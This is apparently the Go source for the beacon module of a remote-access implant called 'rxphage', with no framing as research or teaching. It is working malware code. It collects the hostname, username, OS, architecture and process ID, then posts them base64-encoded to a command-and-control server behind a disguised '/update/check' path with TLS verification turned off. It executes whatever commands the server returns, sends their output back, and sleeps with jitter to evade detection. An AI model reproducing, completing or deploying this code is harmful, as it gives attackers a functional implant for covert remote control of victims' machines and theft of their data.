package beacon

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"time"

	"rxphage/config"
	"rxphage/handler"
)

type checkIn struct {
	ID         string `json:"id"`
	Hostname   string `json:"h"`
	Username   string `json:"u"`
	OS         string `json:"o"`
	Arch       string `json:"a"`
	PID        int    `json:"p"`
	SeqNum     int    `json:"s"`
	CampaignID string `json:"c"`
}

type taskResponse struct {
	TaskID  string `json:"task_id"`
	Command string `json:"cmd"`
	Args    string `json:"args"`
}

type taskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Error  bool   `json:"error"`
}

// Run is the main beacon loop — polls C2, executes tasks, sleeps with jitter.
func Run(cfg config.Config) {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}

	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}

	seq := 0
	for {
		seq++
		data := checkIn{
			ID:         implantID(hostname),
			Hostname:   hostname,
			Username:   fmt.Sprintf("%s\\%s", hostname, user),
			OS:         runtime.GOOS,
			Arch:       runtime.GOARCH,
			PID:        os.Getpid(),
			SeqNum:     seq,
			CampaignID: cfg.CampaignID,
		}

		tasks := doCheckin(client, cfg, data)
		for _, task := range tasks {
			out := handler.Execute(task.Command, task.Args)
			sendResult(client, cfg, task.TaskID, out)
		}

		time.Sleep(jitter(cfg.SleepMin, cfg.SleepMax, cfg.Jitter))
	}
}

func doCheckin(client *http.Client, cfg config.Config, data checkIn) []taskResponse {
	body, _ := json.Marshal(data)
	encoded := base64.StdEncoding.EncodeToString(body)

	url := fmt.Sprintf("https://%s:%d/update/check", cfg.C2Primary, cfg.C2Port)
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(encoded))
	if err != nil {
		return nil
	}
	req.Header.Set("User-Agent", cfg.UserAgent)
	req.Header.Set("X-Client-Id", data.ID)
	req.Header.Set("X-Session", fmt.Sprintf("%d", data.SeqNum))
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	var tasks []taskResponse
	json.NewDecoder(resp.Body).Decode(&tasks)
	return tasks
}

func sendResult(client *http.Client, cfg config.Config, taskID string, output []byte) {
	result := taskResult{
		TaskID: taskID,
		Output: base64.StdEncoding.EncodeToString(output),
	}
	body, _ := json.Marshal(result)
	url := fmt.Sprintf("https://%s:%d/update/result", cfg.C2Primary, cfg.C2Port)
	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", cfg.UserAgent)
	req.Header.Set("X-Client-Id", taskID)
	client.Do(req)
}

// implantID derives a stable identifier from the hostname (no PII, no UUIDs).
func implantID(hostname string) string {
	h := 0
	for _, c := range hostname {
		h = h*31 + int(c)
	}
	return fmt.Sprintf("RX-%08X", h&0xFFFFFFFF)
}

func jitter(min, max int, pct float64) time.Duration {
	if max <= min {
		max = min + 1
	}
	base := min + rand.Intn(max-min)
	delta := float64(base) * pct
	jit := (rand.Float64()*2 - 1) * delta
	d := float64(base) + jit
	if d < 1 {
		d = 1
	}
	return time.Duration(d) * time.Second
}
